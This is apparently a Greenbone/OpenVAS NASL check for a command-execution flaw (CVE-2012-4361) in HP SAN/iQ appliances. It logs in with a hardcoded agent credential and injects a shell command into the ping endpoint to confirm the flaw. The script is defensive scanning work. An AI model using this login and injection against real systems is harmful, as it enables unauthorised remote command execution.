if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802454" );
	script_version( "2020-11-09T11:11:32+0000" );
	script_cve_id( "CVE-2012-4361" );
	script_bugtraq_id( 55132 );
	script_tag( name: "cvss_base", value: "7.7" );
	script_tag( name: "cvss_base_vector", value: "AV:A/AC:L/Au:S/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-11-09 11:11:32 +0000 (Mon, 09 Nov 2020)" );
	script_tag( name: "creation_date", value: "2012-09-05 14:44:25 +0530 (Wed, 05 Sep 2012)" );
	script_name( "HP SAN/iQ Virtual SAN Appliance Second Parameter Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "General" );
	script_dependencies( "find_service.sc" );
	script_require_ports( "Services/unknown", 13838 );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/441363" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18893/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18901/" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary commands
  the context of an application." );
	script_tag( name: "affected", value: "HP SAN/iQ version prior to 9.5 on HP Virtual SAN Appliance" );
	script_tag( name: "insight", value: "The flaw is due to an error in 'lhn/public/network/ping' which does not
  properly handle shell meta characters in the second parameter." );
	script_tag( name: "solution", value: "Upgrade to HP SAN/iQ 9.5 or later." );
	script_tag( name: "summary", value: "This host is running HP SAN/iQ Virtual SAN Appliance and is prone
  to remote command execution vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("byte_func.inc.sc");
func create_packet( cmd ){
	packet = "";
	packet = crap( data: raw_string( 0x00 ), length: 7 ) + raw_string( 0x01 ) + mkdword( strlen( cmd ) ) + crap( data: raw_string( 0x00 ), length: 15 ) + raw_string( 0x14, 0xff, 0xff, 0xff, 0xff ) + cmd;
	return packet;
}
func hydra_send_recv(socket,request ){
	header = "";
	data = "";
	send( socket: socket, data: request );
	header = recv( socket: socket, length: 32 );
	data = recv( socket: socket, length: 1024 );
	return data;
}
port = unknownservice_get_port( default: 13838 );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
login = create_packet( "login:/global$agent/L0CAlu53R/Version \"9.5.0\"" );
res = hydra_send_recv( soc, login );
if(res && ContainsString( res, "OK: Login" )){
	cmd = "id";
	ping = create_packet( "get:/lhn/public/network/ping/127.0.0.1/|" + cmd + " #/64/5/" );
	res = hydra_send_recv( soc, ping );
	if(res && ContainsString( res, "incorrect number of parameters specified" )){
		ping = create_packet( "get:/lhn/public/network/ping/127.0.0.1/|" + cmd + " #/" );
		res = hydra_send_recv( soc, ping );
	}
}
close( soc );
if(res && egrep( string: res, pattern: "uid=[0-9]+.*gid=[0-9]+.*" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

